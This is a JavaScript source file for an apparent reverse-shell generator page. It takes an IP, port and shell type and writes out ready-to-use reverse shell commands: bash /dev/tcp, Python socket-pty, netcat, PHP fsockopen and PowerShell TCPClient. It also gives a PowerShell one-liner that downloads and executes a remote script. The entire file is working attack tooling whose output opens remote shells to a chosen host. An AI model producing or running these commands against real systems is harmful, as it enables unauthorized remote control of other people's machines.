document.addEventListener('DOMContentLoaded', function () {
    const ip = document.getElementById('ip')
    const port = document.getElementById('port')
    const type = document.getElementById('type')
    const submit = document.getElementById('submit')

    submit.onclick = function () {
        if (ip.value === '' | port.value === '' | type.value === '') {
            alert('Arguments Missing')
        }
        else {
            if (type.value === 'bash') {
                document.write('Option 1:',"<br>")
                document.write('bash -i >& /dev/tcp/',ip.value,'/',port.value,' 0>&1')
            }
            if (type.value === 'python') {
                const vaina = "/bin/bash"
                document.write('Option 1:',"<br>")
                document.write("python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"",ip.value,"\",",port.value,"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"",vaina,"\")'","<br>")
                document.write('Option 2:',"<br>")
                document.write("python2 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"",ip.value,"\",",port.value,"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"",vaina,"\")'")
            }
            if (type.value === 'netcat') {
                document.write('Option 1:',"<br>")
                document.write('nc -e /bin/sh ',ip.value," ", port.value,"<br>")
                document.write('Option 2:',"<br>")
                document.write('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ',ip.value,' ',port.value,' >/tmp/f')
            }
            if (type.value === 'php') {
                const vaina = "/bin/bash"
                document.write('Option 1:',"<br>")
                document.write("php -r '$sock=fsockopen(\"",ip.value,"\",",port.value,");exec(\"",vaina," -i <&3 >&3 2>&3\");'")
            }
            if (type.value === 'powershell') {
                document.write('Option 1:',"<br>")
                document.write('powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"',ip.value,'\",',port.value,');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',"<br>")
                document.write('Option 2:',"<br>")
                document.write("powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')")
            }
            if (type.value === 'icmp') {
                document.write('Working in this reverse shell...')
            }
            if (type.value === 'dns') {
                document.write('Working in this reverse shell...')
            }
        }
    }
})